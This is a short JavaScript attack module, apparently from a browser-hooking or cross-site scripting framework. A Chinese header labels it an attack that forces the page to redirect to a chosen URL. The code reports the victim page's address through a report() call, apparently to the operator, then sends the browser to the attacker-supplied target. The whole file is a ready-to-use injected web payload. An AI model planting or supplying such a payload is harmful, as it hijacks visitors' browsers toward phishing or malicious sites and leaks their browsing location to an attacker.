// MODULE = {"desc": "强制跳转:页面立即跳转到指定 URL", "category": "攻击", "params": [["url", "跳转目标 URL,默认 https://example.com"]]}
(function () {
  var target = _q("url", "{{url}}") || "https://example.com";
  report({ type: "redirect", url: location.href, target: target });
  window.location.href = target;
})();
